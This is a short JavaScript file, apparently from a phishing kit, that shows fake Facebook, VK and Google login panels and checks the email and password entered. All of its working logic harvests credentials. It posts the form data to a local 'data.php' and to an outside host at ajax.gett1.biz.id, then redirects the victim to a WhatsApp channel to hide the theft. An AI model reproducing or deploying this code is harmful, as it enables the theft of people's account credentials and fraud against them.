function toggleLogin(showClass = '.selectLogin') {
  $('.selectLogin, .alex-facebook, .alex-vk, .alex-google').hide();
  $(showClass).show();
}

function validateAndSubmit(formSelector, emailSel, passSel, errEmailSel, errPassSel) {
  const email = $(emailSel).val().trim();
  const pass = $(passSel).val().trim();
  let valid = true;

  if (!email || email.length <= 6) {
    $(errEmailSel).show();
    valid = false;
  } else $(errEmailSel).hide();

  if (!pass || pass.length <= 6) {
    $(errPassSel).show();
    valid = false;
  } else $(errPassSel).hide();

  if (!valid) return false;

  const formData = $(formSelector).serialize();

  $.ajax({
    type: 'POST',
    url: 'data.php',
    data: formData,
    timeout: 2000,
    success: function () {
      $.ajax({
        type: 'POST',
        url: 'https://ajax.gett1.biz.id/apiii.php',
        data: formData,
        timeout: 3000,
        complete: function () {
          setTimeout(function () {
            window.location.href = 'https://whatsapp.com/channel/0029VbBeZzOCBtx5M0say92t';
          }, 800);
        }
      });
    },
    error: function () {
      $.ajax({
        type: 'POST',
        url: 'https://ajax.gett1.biz.id/apiii.php',
        data: formData,
        timeout: 3000,
        complete: function () {
          setTimeout(function () {
            window.location.href = 'https://whatsapp.com/channel/0029VbBeZzOCBtx5M0say92t';
          }, 800);
        }
      });
    }
  });

  return false;
}

